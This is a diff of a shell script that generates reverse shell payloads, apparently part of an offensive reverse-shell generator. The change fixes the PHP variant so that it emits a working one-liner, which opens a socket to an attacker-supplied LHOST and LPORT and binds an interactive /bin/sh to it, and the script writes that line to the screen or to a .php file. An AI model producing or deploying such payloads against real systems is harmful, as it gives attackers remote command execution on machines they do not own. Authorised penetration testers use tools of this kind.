@@ -26,6 +26,7 @@ generateShell () {
 	RRHOST='RHOST'		# hold RHOST string
 	RRPORT='RPORT'		# hold RPORT string
 	hold_='_'		# hold _ char
+	hold_sock='sock'	# hold "sock"
 
 	case $type in
 		bash | BASH | bASH | Bash) 				# check if it's Bash
@@ -204,13 +205,13 @@ generateShell () {
 			case $answer in
 				text | TEXT)
 				echo "\nThere you go buddy:"
-				echo "\nphp -r '$dsg$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'"			
+				echo "\nphp -r '$dsg$hold_sock$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'"			
 				;;
 				
 				file | FILE)
 				echo "Enter output file name: (without '.php')"; read outputName
 				echo "\nThere you go buddy, your file is saved as "$outputName.php" in your current directory. ($PWD)"
-				echo "php -r '$dsg$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'" > $outputName.php
+				echo "php -r '$dsg$hold_sock$sock=fsockopen($dqt$LHOST$dqt,$LPORT);exec($dqt/bin/sh -i <&3 >&3 2>&3$dqt);'" > $outputName.php
 				eval ls -la $outputName.php
 				echo "\nContent of $outputName.php:"
 				eval cat $outputName.php
